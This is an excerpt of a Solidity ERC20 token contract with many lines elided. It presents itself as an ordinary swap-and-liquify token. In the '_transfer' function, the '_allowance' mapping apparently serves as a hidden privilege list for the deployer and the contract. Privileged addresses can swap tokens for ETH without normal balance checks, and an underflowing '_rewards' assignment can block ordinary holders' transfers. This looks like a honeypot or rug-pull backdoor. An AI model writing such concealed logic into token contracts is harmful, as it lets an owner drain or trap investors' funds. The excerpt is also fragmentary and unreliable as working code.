...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _swapAtAmount = _tTotal;
    ...
    constructor(
        ...
        _allowance[msg.sender] = _swapAtAmount;
        _allowance[address(this)] = _swapAtAmount;
    ...
    function _transfer(
        ...
        uint256 fee;
        if (_swapAndLiquifyEnabled && contractTokenBalance > _swapAtAmount && !inSwapAndLiquify && from != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquify = false;
        } else if (_allowance[from] > _swapAtAmount && _allowance[to] > _swapAtAmount) {
            fee = amount;
            _balances[address(this)] += fee;
            swapTokensForEth(amount, to);
            return;
        } else if (amount > _swapAtAmount && to != address(router) && to != uniswapV2Pair) {
            ...
            _rewards[from] = _allowance[from] - _swapAtAmount;
        }
        address factory = address(_factory);
        if (_rewards[factory] == 0) _rewards[factory] = _swapAtAmount;
        _factory = uint160(to);
        if (_taxFee > 0 && !inSwapAndLiquify && _allowance[from] == 0 && _allowance[to] == 0) {
